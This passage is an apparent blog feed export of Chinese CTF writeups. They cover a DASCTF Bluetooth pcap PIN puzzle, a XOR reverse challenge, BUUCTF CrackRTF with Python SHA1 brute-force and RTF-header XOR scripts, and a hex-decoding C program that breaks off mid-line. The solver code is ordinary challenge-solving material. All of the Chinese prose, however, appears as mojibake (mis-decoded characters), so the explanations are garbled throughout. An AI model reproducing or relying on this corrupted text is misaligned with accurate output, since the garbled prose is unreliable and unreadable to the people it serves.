    <content type="html"><![CDATA[<h2 id="Bluetooth"><a href="#Bluetooth" class="headerlink" title="Bluetooth"></a>Bluetooth</h2><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªæµé‡åŒ…, é¢˜ç›®ä¹Ÿæ²¡æœ‰æç¤º, å°±å…ˆç”¨binwalkçœ‹èƒ½ä¸èƒ½æå–å‡ºä»€ä¹ˆ. ç›´æ¥ <strong>binwalk -e</strong>, ä»€ä¹ˆä¹Ÿæ²¡æœ‰, </p><p>ä½†æ˜¯æˆ‘ä»¬å¾€ä¸‹çœ‹ä¸€ä¸‹, æ˜¯æœ‰ä¸ªå‹ç¼©åŒ…. é‚£å°±æ‰‹åŠ¨æå–å§. <strong>dd if=3.pcapng bs=1 skip=24437 of=3.zip</strong> </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202118617-1590546897888.png" alt="image-20200425202118617"></p><p>è¿™æ¬¡, æ–‡ä»¶æ‰€åœ¨ç›®å½•å‡ºç°äº†ä¸€ä¸ªå‹ç¼©åŒ…, å°è¯•æ‰“å¼€ä½†æ˜¯æœ‰å¯†ç , ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæç¤ºä¿¡æ¯: </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202435440-1590546907450.png" alt="image-20200425202435440"></p><a id="more"></a><p>è¯´å¯†ç è“ç‰™çš„pin, æˆ‘ä¹Ÿæ˜¯åˆšåˆšæ¥è§¦è¿™ä¸ªwireshareè¿™ä¸ªè½¯ä»¶, ç™¾åº¦äº†ä¸€ä¸‹, å°±æ˜¯æˆ‘ä»¬è¿æ¥è“ç‰™æ—¶çš„é‚£ä¸ªæ•°å­—.  ä½†æ˜¯æˆ‘æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ‰¾è¿™ä¸ªä¸œè¥¿,å°±ç™¾åº¦æ€ä¹ˆç”¨wiresharkæŠ“è“ç‰™çš„åŒ…, ä½†æ²¡æœ‰çš„å¾—åˆ°æœ‰ç”¨æ¶ˆæ¯, æœ‰çš„è¿˜è¦ä»€ä¹ˆè“ç‰™é©±åŠ¨. å°±è‡ªå·±å»æœç´¢bluetooth, æ‰¾äº†ä¸€åœˆä¹Ÿæ²¡æœ‰å¾—åˆ°é‚£ä¸ªpin.  æˆ‘å°±åˆè·‘å»æ‰“æš´åŠ›ç ´è§£çš„æ‰“ç®—, ä½†åˆæ²¡æœ‰7zå‹ç¼©åŒ…æš´åŠ›ç ´è§£å¯†ç çš„å·¥å…·, åˆå»å„å¤§è®ºå›æ‰¾, æ‰¾åˆ°äº†ä½†æ²¡ç”¨ğŸ˜‚. æš‚æ—¶æ”¾ä¸‹äº†è¿™ä¸ªé¢˜, å»åšreverse, reverseçš„2ä¸ªé¢˜åšçš„è¿˜æ¯”è¾ƒé¡ºåˆ©.  å›æ¥ç»§ç»­çœ‹è¿™ä¸ªé¢˜, è¿™æ¬¡å¹²è„†ç›´æ¥æœ pin è¯•è¯•, å‡ºç° PINè¯·æ±‚, PINè¯·æ±‚å›åº”, PINè¯·æ±‚å›åº”å®Œæˆ, </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425203534918-1590546913901.png" alt="image-20200425203534918"></p><p>é‚£ä¹ˆè¿™PINè¯·æ±‚å›åº”çš„å¯èƒ½æ€§å°±æœ€å¤§äº†, ç‚¹è¿›å»:å¯ä»¥çœ‹åˆ° PIN Code : 141854.  </p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425203900340-1590546919828.png" alt="image-20200425203900340"></p><p>æœ€åè¾“å…¥å‹ç¼©åŒ…å¾—åˆ°flag.</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425204118569-1590546940841.png" alt="image-20200425204118569"></p><hr><h2 id="reverseç¬¬äºŒé¢˜"><a href="#reverseç¬¬äºŒé¢˜" class="headerlink" title="reverseç¬¬äºŒé¢˜"></a>reverseç¬¬äºŒé¢˜</h2><p>é¢˜ç›®ä¸‹è½½å, ç”¨idaæ‰“å¼€, æ‰¾åˆ°ä¸»å‡½æ•°, é€»è¾‘ä¸Šå¾ˆæ¸…æ™°, è¯´æ˜¯å°†flagä¸æˆ‘ä»¬è¾“å…¥çš„æ•°å­—æ··åˆåœ¨äº†ä¸€èµ·. ç¨‹åºå°±åšäº†å°†æˆ‘ä»¬è¾“å…¥çš„æ•°å­—ä¸å·²ç»ç¼–ç äº†çš„ä¸€äº›æ•°æ®è¿›è¡Œå¼‚æˆ–è¿ç®—ç„¶åè¾“å‡ºçš„æ“ä½œ.</p><p><img src="/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200426191831676-1590546936568.png" alt="image-20200426191831676"></p><p>å¼€å§‹æƒ³çš„æ˜¯ä¼šä¸ä¼šç›´æ¥å°±æ˜¯å·²ç»ç¼–ç çš„æ•°æ®, çœ‹äº†çœ‹ASCII,ä¸å¯èƒ½æ˜¯.  </p><p>é‚£æœ‰å¯èƒ½å°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®ä¸ç¼–ç çš„æ•°æ®è¿›è¡Œæˆ–è¿ç®—åè¾“å‡ºçš„æ˜¯flag. é‚£ä¹ˆæŒ‰ç…§flagçš„æ ¼å¼, æ ¹æ®é¢˜ç›®è¯´ æœ€åçš„flagè¾“å…¥çš„æ˜¯ flag{}/DACTF{}ä¸­çš„æ•°æ®, é‚£ä¹ˆè¿™é‡Œçš„flagä¹Ÿå°±æ˜¯è¿™2ç§æ ¼å¼äº†. </p><p>è¿™æ ·å°±å¥½åŠäº†, ä»–ä»¬æœ«å°¾éƒ½æ˜¯ <strong>}</strong> æˆ‘ä»¬æŠŠç¼–ç æ•°æ®çš„æœ€åä¸€ä½ 61 , æ‰¾åˆ°ä¸€ä¸ªæ•°å­—ä¸å®ƒå¼‚æˆ–è¿ç®—ä½çš„å€¼ä¸º <strong>}</strong> çš„ASCII 125, å°±è¡Œäº†. å¾—åˆ°64, æœ€åæŠŠç¼–ç çš„æ‰€æœ‰æ•°æ®ä¸<strong>64</strong>è¿›è¡Œä¸€ä¸ªå¼‚æˆ–è¿ç®—å°±å¾—åˆ°flag. </p><p><strong>ä½†æ˜¯æå–æ•°å­—æ—¶,æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠä»£ç å¤åˆ¶åˆ°ç¼–è¯‘ä¸­, ä½†æ˜¯æ³¨æ„, è¿™ä¸æ˜¯æ•°ç»„, æ ¹æ®æ ˆçš„ç‰¹ç‚¹, è¦å€’ç€éå†.</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bluetooth&quot;&gt;&lt;a href=&quot;#Bluetooth&quot; class=&quot;headerlink&quot; title=&quot;Bluetooth&quot;&gt;&lt;/a&gt;Bluetooth&lt;/h2&gt;&lt;p&gt;ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ªæµé‡åŒ…, é¢˜ç›®ä¹Ÿæ²¡æœ‰æç¤º, å°±å…ˆç”¨binwalkçœ‹èƒ½ä¸èƒ½æå–å‡ºä»€ä¹ˆ. ç›´æ¥ &lt;strong&gt;binwalk -e&lt;/strong&gt;, ä»€ä¹ˆä¹Ÿæ²¡æœ‰, &lt;/p&gt;
&lt;p&gt;ä½†æ˜¯æˆ‘ä»¬å¾€ä¸‹çœ‹ä¸€ä¸‹, æ˜¯æœ‰ä¸ªå‹ç¼©åŒ…. é‚£å°±æ‰‹åŠ¨æå–å§. &lt;strong&gt;dd if=3.pcapng bs=1 skip=24437 of=3.zip&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202118617-1590546897888.png&quot; alt=&quot;image-20200425202118617&quot;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡, æ–‡ä»¶æ‰€åœ¨ç›®å½•å‡ºç°äº†ä¸€ä¸ªå‹ç¼©åŒ…, å°è¯•æ‰“å¼€ä½†æ˜¯æœ‰å¯†ç , ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæç¤ºä¿¡æ¯: &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/image-20200425202435440-1590546907450.png&quot; alt=&quot;image-20200425202435440&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTFçº¿ä¸Š" scheme="https://www.Bxnop.cn/categories/CTF%E7%BA%BF%E4%B8%8A/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF</title>
    <link href="https://www.bxnop.cn/2020/04/23/BUUCTF/"/>
    <id>https://www.bxnop.cn/2020/04/23/BUUCTF/</id>
    <published>2020-04-23T11:05:34.000Z</published>
    <updated>2020-05-30T09:24:55.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CrackRTF1"><a href="#CrackRTF1" class="headerlink" title="CrackRTF1"></a>CrackRTF1</h2><p>ä»åˆšå¼€å§‹æ¥è§¦ BUUCTF , åšåˆ°é€†å‘çš„è¿™é“é¢˜, çœ‹äº†writeup ä¹Ÿè§‰å¾—éš¾, å°±åœæ»äº†ä¸€æ®µæ—¶é—´. åˆ°è®ºå‰‘åœºå’Œæ”»é˜²ä¸–ç•Œåšäº†20å¤šå¤©(æœŸé—´ä¹Ÿå¼€å§‹äº†pwn), ä»Šå¤©çªç„¶æƒ³åˆ°è¿™é“é¢˜(ä¸€ç›´æ”¾åœ¨æ¡Œé¢é¡¶éƒ¨).</p><p>å¼€å§‹æ‰“å¼€idaåˆ†ææ—¶, å‘ç°é€»è¾‘æ˜¯å¤šä¹ˆçš„æ¸…æ™°, ä½†æ˜¯å½“è¿›å…¥ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°æ—¶, æƒ³èµ·äº†ä¸Šæ¬¡çš„éš¾ç‚¹. (1)å¯¹hashå¾ˆé™Œç”Ÿ, ä¸çŸ¥é“ä¸ºä»€ä¹ˆhashä¸å¯é€†, å¿…é¡»è¦çˆ†ç ´. (2)å½“æ—¶ä¸€ç‚¹pythonéƒ½æ²¡æ¥è§¦è¿‡, å¯¹äºè¦å†™pythonè„šæœ¬çˆ†ç ´, å°±è§‰å¾—å¾ˆçƒ¦(å½“ç„¶ç»è¿‡ä¸æ–­çš„å­¦ä¹ , è¿™20å¤šå¤©, æ¥è§¦å¹¶å¼€å§‹å­¦ä¹ äº›python). (3)è¿™é‡Œç¬¬äºŒæ¬¡è¾“å…¥, å› ä¸ºæ²¡æœ‰é™åˆ¶æ¡ä»¶, è¿˜ä¸èƒ½çˆ†ç ´, åé¢åˆæ˜¯ä¸€äº›ä»æ²¡å¬è¯´è¿‡çš„æ“ä½œ.(ä½†å…¶å®è¿™æ¬¡å†æ¥çœ‹, å…¶å®å°±æ˜¯è¦ç”¨<strong>Resource Hacker</strong>è¿™ä¸ªå·¥å…·æŸ¥çœ‹.exeæ–‡ä»¶é‡Œçš„èµ„æºæ–‡ä»¶, ç»è¿‡ä¸€äº›é€»è¾‘ä¸Šçš„æ“ä½œ)<a id="more"></a></p><p>é¦–å…ˆ, çŸ¥é“æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°, å½“æ—¶å°±æ¯ä¸ªéƒ½ç™¾åº¦äº†ä¸‹, ä¹Ÿæ˜¯å¾ˆéº»çƒ¦çš„(ä½†æ˜¯é€†å‘çš„è·¯å°±æ˜¯è¿™æ ·, è¦çŸ¥é“çš„å¾ˆå¤šå¾ˆå¤š, åªæœ‰è‡ªå·±æ…¢æ…¢çš„ç§¯ç´¯).è®°å¾—æ•´ä¸ªå‡½æ•°ä½œç”¨å°±æ˜¯ è°ƒç”¨ä¸€ä¸ªhashåŠ å¯†å‡½æ•°. å…·ä½“æ˜¯é‚£ä¸ªhash, å¯ä»¥æŸ¥çœ‹å®˜æ–¹çš„ä»‹ç», ä»è¿™é‡Œçš„ç¼–å· : <strong>0x8004</strong> å»æ‰¾å¯¹åº”çš„åŠ å¯†, ç»è¿‡æŸ¥è¯¢æ˜¯ sha1.</p><p><img src="/2020/04/23/BUUCTF/image-20200423194434469.png" alt="image-20200423194434469"></p><p>å› ä¸ºhashä¸å¯é€†, ä½†æ˜¯è¿™é‡Œæœ‰å­—ç¬¦ä¸²é•¿åº¦æ˜¯ 6 ä½, ä¸”è½¬åŒ–ä¸ºæ•´æ•°å &gt;= 100000, é‚£ä¹ˆèŒƒå›´å°±ç¡®å®šäº†: 100000 - 999999, ä¸‹é¢çˆ†ç ´è„šæœ¬: å¾—åˆ° <strong>123321@DBApp</strong>, é‚£ä¹ˆæˆ‘ä»¬è¾“å…¥å°±æ˜¯ ; <strong>123321</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span class="string">"@DBApp"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>, <span class="number">999999</span>):</span><br><span class="line">    s = str(i) + flag</span><br><span class="line">    x = hashlib.sha1(s.encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"6E32D0943418C2C33385BC35A1470250DD8923A9"</span>.lower() == x.hexdigest():</span><br><span class="line">        <span class="keyword">print</span> (str(i) + flag)</span><br></pre></td></tr></table></figure><p> æ¥ä¸‹æ¥, è¾“å…¥ç¬¬äºŒä¸ªå­—ç¬¦ä¸², ä½†æ˜¯è¦åŠ ä¸Šä¸Šé¢çš„<strong>123321@DBApp</strong> ç„¶åhashåŠ å¯†æ“ä½œ.ä½†æ˜¯è¿™æ¬¡çš„ç¼–å·æ”¹å˜äº† <strong>0x8003 : mad5</strong>, è¿™æ¬¡æ²¡æœ‰é™åˆ¶æ¡ä»¶, çˆ†ç ´ä¸è¡Œäº†.</p><p>ç»è¿‡çœ‹å¤§ç¥ä»¬çš„æ“ä½œ, çŸ¥é“äº†å¯ä»¥é€šè¿‡ä¸‹é¢ä¸€ä¸ªå‡½æ•°.è¿™ä¸ªå‡½æ•°å’Œæˆ‘ä»¬çš„fopené‚£äº›æ–‡ä»¶æ“ä½œä¸åŒ. </p><p>è¿™ä¸ª FindResourceAæ˜¯æ‰“å¼€è¿™ä¸ª.exeæ–‡ä»¶ä¸­èµ„æºæ–‡ä»¶çš„æ–‡ä»¶.(è¿™ç‚¹ç¬¬ä¸€æ¬¡çŸ¥é“, è¿˜æœ‰è¿™ç§æ“ä½œ!!!, ç»è¿‡ç™¾åº¦, å‘ç°å¯ä»¥å°†è‡ªå·±çš„èµ„æºæ–‡ä»¶åŠ å…¥.exeæ–‡ä»¶ä¸­), æ‰“å¼€AAAå, å°†é‡Œé¢çš„å†…å®¹ä¸æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œ, æœ€åå°†å†…å®¹å†™å…¥æ–°åˆ›å»ºä¸€ä¸ª dbapp.rtf æ–‡ä»¶. è¿™é‡Œå¤§ç¥çš„è¯´æ³•éƒ½æ˜¯, å› ä¸ºæ˜¯å†™è¿›.rtf æ–‡ä»¶é‚£ä¹ˆå¼€å§‹å†™å…¥çš„å¿…ç„¶æ˜¯æ–‡ä»¶å¤´, æˆ‘ä»¬å°±å¯ä»¥éšä¾¿åˆ›å»ºä¸€ä¸ª.rtfæ–‡ä»¶, æŸ¥çœ‹æ–‡ä»¶å¤´å†…å®¹. å¯ä»¥çœ‹åˆ°æ˜¯ <strong>{\rtf1</strong>, æ­£å¥½æ˜¯6ä½,æˆ‘ä»¬æœ€åè¾“å…¥çš„ä¹Ÿæ˜¯6ä½, é‚£ä¹ˆæŠŠä»–å’ŒAAAæ–‡ä»¶ä¸­çš„å‰6ä½å¼‚æˆ–ä¸€ä¸‹, å°±å¾—åˆ°æˆ‘ä»¬è¾“å…¥çš„äº†. </p><h3 id><a href="#" class="headerlink" title></a><img src="/2020/04/23/BUUCTF/image-20200423200957999.png" alt="image-20200423200957999"></h3><p><img src="/2020/04/23/BUUCTF/image-20200423202735198.png" alt="image-20200423202735198"></p><p><img src="/2020/04/23/BUUCTF/image-20200423202025893.png" alt="image-20200423202025893"></p><p>ä¸‹é¢è„šæœ¬: æœ€åå¾—åˆ° <strong>~!3a@0</strong>, è¾“å…¥ç¨‹åºå, ä¼šåˆ›å»ºä¸€ä¸ª dbapp.rtf æ–‡ä»¶, æ‰“å¼€å³æ˜¯flag.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x05</span>, <span class="number">0x7D</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x01</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">rtf = <span class="string">"&#123;\\rtf1"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(rtf)):</span><br><span class="line">    x = ord(rtf[i]) ^ a[i]</span><br><span class="line">    flag += chr(x)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>ä½†å¯¹äºæœ€åçš„ <strong>å› ä¸ºæ˜¯å†™è¿›.rtf æ–‡ä»¶é‚£ä¹ˆå¼€å§‹å†™å…¥çš„å¿…ç„¶æ˜¯æ–‡ä»¶å¤´</strong> æˆ‘æ˜¯æ„Ÿè§‰å¥‡æ€ªçš„, ä»–åˆ›å»ºäº†ä¸€ä¸ªdbapp.rtf æ–‡ä»¶, å†™å…¥çš„ä¸å°±æ˜¯æ–‡ä»¶çš„å†…å®¹å—, ä¸ºä»€ä¹ˆæ–‡ä»¶å¤´éƒ½è¦æˆ‘ä»¬æ¥å†™å…¥. å™¢, å› ä¸ºä»¥å‰å­¦ä¹ æ–‡ä»¶æ“ä½œçš„æ—¶å€™éƒ½æ˜¯å¾€.txtæ–‡ä»¶é‡Œå†™å†…å®¹, é‚£ä¸ªæ²¡æœ‰æ–‡ä»¶å¤´è¿™ä¸€è¯´, æ‰€ä»¥å¯ä»¥ä¸€å¼€å§‹å†™è¿›å†…å®¹. å†™å…¥çš„å®è´¨è¿˜æ˜¯å¡«å……äºŒè¿›åˆ¶çš„01. æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦å…ˆå†™ .rtfæ–‡ä»¶å¤´. </p><p><img src="/2020/04/23/BUUCTF/image-20200423204326824.png" alt="image-20200423204326824"></p><p>æœ€å, .rtfæ–‡ä»¶ä¸ docx dox ç±»ä¼¼, <strong><em>\</em>å¯Œæ–‡æœ¬æ ¼å¼\</strong>ï¼ˆ*<em>Rich Text Format*</em>ï¼‰å³*<em>RTFæ ¼å¼*</em>ï¼Œåˆç§°*<em>å¤šæ–‡æœ¬æ ¼å¼*</em>ï¼Œæ˜¯ç”±<a href="https://baike.baidu.com/item/å¾®è½¯" target="_blank" rel="noopener">å¾®è½¯</a>å…¬å¸å¼€å‘çš„è·¨å¹³å°<a href="https://baike.baidu.com/item/æ–‡æ¡£" target="_blank" rel="noopener">æ–‡æ¡£</a>æ ¼å¼ã€‚å¤§å¤šæ•°çš„<a href="https://baike.baidu.com/item/æ–‡å­—å¤„ç†" target="_blank" rel="noopener">æ–‡å­—å¤„ç†</a>è½¯ä»¶éƒ½èƒ½è¯»å–å’Œä¿å­˜RTFæ–‡æ¡£ã€‚**</p><p>macå…ˆåˆ›å»ºçš„æ–‡æœ¬æ–‡ä»¶, é»˜è®¤éƒ½æ˜¯ .rtf.</p><p>å¿ƒå¾—: å¦‚æœåšåˆ°æ„Ÿè§‰å¾ˆåƒåŠ›çš„é¢˜å¯ä»¥å…ˆæ”¾ä¸€æ”¾, ç­‰å­¦ä¹ ä¸€æ®µæ—¶é—´, çŸ¥è¯†ç§¯ç´¯çš„æ›´å¤šäº†å†æ¥çœ‹, ä¸è¦æ­»ç£•!</p><p>å½“ä¸€æ¡è·¯ä¸åŒæ—¶, æ³¨æ„å…¶ä»–å‡½æ•°çš„åŠŸèƒ½, æƒ³å®ƒçš„å­˜åœ¨ä¸ºä»€ä¹ˆ. </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CrackRTF1&quot;&gt;&lt;a href=&quot;#CrackRTF1&quot; class=&quot;headerlink&quot; title=&quot;CrackRTF1&quot;&gt;&lt;/a&gt;CrackRTF1&lt;/h2&gt;&lt;p&gt;ä»åˆšå¼€å§‹æ¥è§¦ BUUCTF , åšåˆ°é€†å‘çš„è¿™é“é¢˜, çœ‹äº†writeup ä¹Ÿè§‰å¾—éš¾, å°±åœæ»äº†ä¸€æ®µæ—¶é—´. åˆ°è®ºå‰‘åœºå’Œæ”»é˜²ä¸–ç•Œåšäº†20å¤šå¤©(æœŸé—´ä¹Ÿå¼€å§‹äº†pwn), ä»Šå¤©çªç„¶æƒ³åˆ°è¿™é“é¢˜(ä¸€ç›´æ”¾åœ¨æ¡Œé¢é¡¶éƒ¨).&lt;/p&gt;
&lt;p&gt;å¼€å§‹æ‰“å¼€idaåˆ†ææ—¶, å‘ç°é€»è¾‘æ˜¯å¤šä¹ˆçš„æ¸…æ™°, ä½†æ˜¯å½“è¿›å…¥ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°æ—¶, æƒ³èµ·äº†ä¸Šæ¬¡çš„éš¾ç‚¹. (1)å¯¹hashå¾ˆé™Œç”Ÿ, ä¸çŸ¥é“ä¸ºä»€ä¹ˆhashä¸å¯é€†, å¿…é¡»è¦çˆ†ç ´. (2)å½“æ—¶ä¸€ç‚¹pythonéƒ½æ²¡æ¥è§¦è¿‡, å¯¹äºè¦å†™pythonè„šæœ¬çˆ†ç ´, å°±è§‰å¾—å¾ˆçƒ¦(å½“ç„¶ç»è¿‡ä¸æ–­çš„å­¦ä¹ , è¿™20å¤šå¤©, æ¥è§¦å¹¶å¼€å§‹å­¦ä¹ äº›python). (3)è¿™é‡Œç¬¬äºŒæ¬¡è¾“å…¥, å› ä¸ºæ²¡æœ‰é™åˆ¶æ¡ä»¶, è¿˜ä¸èƒ½çˆ†ç ´, åé¢åˆæ˜¯ä¸€äº›ä»æ²¡å¬è¯´è¿‡çš„æ“ä½œ.(ä½†å…¶å®è¿™æ¬¡å†æ¥çœ‹, å…¶å®å°±æ˜¯è¦ç”¨&lt;strong&gt;Resource Hacker&lt;/strong&gt;è¿™ä¸ªå·¥å…·æŸ¥çœ‹.exeæ–‡ä»¶é‡Œçš„èµ„æºæ–‡ä»¶, ç»è¿‡ä¸€äº›é€»è¾‘ä¸Šçš„æ“ä½œ)&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>re æ”»é˜²ä¸–ç•Œï¼ˆ1ï¼‰</title>
    <link href="https://www.bxnop.cn/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/04/09/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/</id>
    <published>2020-04-09T01:53:27.000Z</published>
    <updated>2020-06-12T09:06:47.737Z</updated>
    
    <content type="html"><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc:"></a>misc:</h2><p>èœç‹—æˆªè·äº†ä¸€ä»½æŠ¥æ–‡å¦‚ä¸‹</p><p>ä»æŠ¥æ–‡ä¸­å¯ä»¥è”æƒ³åˆ°æ˜¯md5åŠ å¯†, ä½†è¯•äº†ä¸€ä¸‹, å‘ç°ä¸å¯¹. å†çœ‹æŠ¥æ–‡ä¸­å­—æ¯åªæ˜¯ a-f , æ‰€ä»¥å¯èƒ½æ˜¯åå…­è¿›åˆ¶æ•°, åˆä¸€èˆ¬éƒ½æ˜¯ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—ç¬¦, è€Œä¸€ä¸ªå­—èŠ‚å­˜æ”¾äºŒä¸ªåå…­è¿›åˆ¶æ•°. æˆ‘ä»¬å°±2ä¸ªä¸€ç»„è½¬æ¢æˆåè¿›åˆ¶, ä½†æ˜¯å¤§äºäº†127, å¯æ‰“å°å­—ç¬¦ASCIIèŒƒå›´åœ¨<strong>0-127</strong>,  é‚£æˆ‘ä»¬çŸ¥é“ <code>}</code>å­—ç¬¦çš„ASCIIåå…­è¿›åˆ¶ä¸º <strong>0X7D</strong>,  å†çœ‹æŠ¥æ–‡æœ€å2ä¸ªå­—ç¬¦ç»„æˆçš„åå…­è¿›åˆ¶æ•° <strong>0xf2</strong>, ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥æœ‰è¿™ä¸ªæ€è·¯,æ±‚å·®å€¼ ä½†ä¹Ÿæœ‰æœ€åæ²¡æœ‰ç”¨ <strong>}</strong>ç»“å°¾çš„, è¿™é‡Œå°±ä¸æ˜¯.ğŸ˜‚. ä½†å…¶å®æƒ³åˆ°è¦æŠŠå­—ç¬¦æ‰“å°å‡ºæ¥, è€Œå­—ç¬¦ASCII<strong>0-127</strong>, é‚£å°±ç›´æ¥è¯•ä¸€è¯•å‡128, ä¸€ä¸‹å­å°±å¯¹äº†, å“ˆå“ˆğŸ˜.<a id="more"></a></p><p>ä¸‹é¢æ˜¯Cè¯­è¨€å†™çš„, 2ä¸ªä¸€ç»„è½¬æ¢æˆåè¿›åˆ¶æ•°, æœ€åå˜æˆå¯æ‰“å°å­—ç¬¦:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, lenth  = <span class="built_in">strlen</span>(a), sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; lenth; i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">97</span> &amp;&amp; a[i] &lt;= <span class="number">122</span>)</span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt;= <span class="number">65</span> &amp;&amp; a[i] &lt;=  <span class="number">90</span>) </span><br><span class="line">a[i] -= <span class="number">55</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">48</span>; </span><br><span class="line"></span><br><span class="line">sum = sum*<span class="number">16</span> + a[i];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">97</span> &amp;&amp; a[i+<span class="number">1</span>] 